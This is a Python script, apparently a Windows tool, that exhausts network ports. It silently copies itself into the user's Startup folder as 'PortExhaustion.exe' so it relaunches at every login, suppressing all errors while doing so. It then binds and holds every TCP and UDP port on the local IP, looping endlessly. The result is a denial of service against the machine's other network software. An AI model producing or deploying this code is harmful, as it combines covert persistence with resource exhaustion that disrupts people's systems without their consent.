import socket
import subprocess
import sys
from win32com.client import Dispatch
import os
import time
import shutil

def iniciar_com_windows():
    caminho_programa = (
        sys.executable if getattr(sys, "frozen", False)
        else os.path.abspath(__file__)
    )

    pasta_inicializar = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    destino = os.path.join(
        pasta_inicializar,
        "PortExhaustion.exe"
    )

    if caminho_programa.lower() != destino.lower():
        shutil.copy2(caminho_programa, destino)

try:
    iniciar_com_windows()
except:
    pass

def detectar_ip():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        try:
            s.connect(("192.0.2.1", 80))
            ip = s.getsockname()[0]

            if ip and not ip.startswith("127."):
                return ip

        except OSError:
            pass

        finally:
            s.close()

        time.sleep(1)

ip = detectar_ip()
sockets_abertos = []

print("\033[2J\033[H", end="", flush=True)
print(f"\033[1;1HIP local detectado: {ip}\033[K", end="", flush=True)
print(f"\033[2;1H{'-' * 40}\033[K", end="", flush=True)
print("\033[3;1H[TCP] Aguardando...\033[K", end="", flush=True)
print("\033[4;1H[UDP] Aguardando...\033[K", end="", flush=True)

porta = 1

ultima_tcp = None
ultima_udp = None

while porta <= 65535:
    try:    
        # Socket TCP
        sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Socket UDP
        sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # TCP
        try:
            sock_tcp.bind((ip, porta))
            sock_tcp.listen(1)

            sockets_abertos.append(sock_tcp)

            ultima_tcp = porta
            print(f"\033[3;1H[TCP] Ocupada: porta {ultima_tcp}\033[K", end="", flush=True)

        except OSError:
            sock_tcp.close()

        # UDP
        try:
            sock_udp.bind((ip, porta))

            sockets_abertos.append(sock_udp)

            ultima_udp = porta
            print(f"\033[4;1H[UDP] Ocupada: porta {ultima_udp}\033[K", end="", flush=True)

        except OSError:
            sock_udp.close()

        if porta >= 65535:
            subprocess.run("cls", shell=True)

            print("-" * 40)
            print(f"Total reservado pelo script: {len(sockets_abertos)}")
            print("Pressione CTRL+C para encerrar.")
            print("-" * 40)

            porta = 1

        porta += 1

    except KeyboardInterrupt:
        print("\nEncerrando...")
        break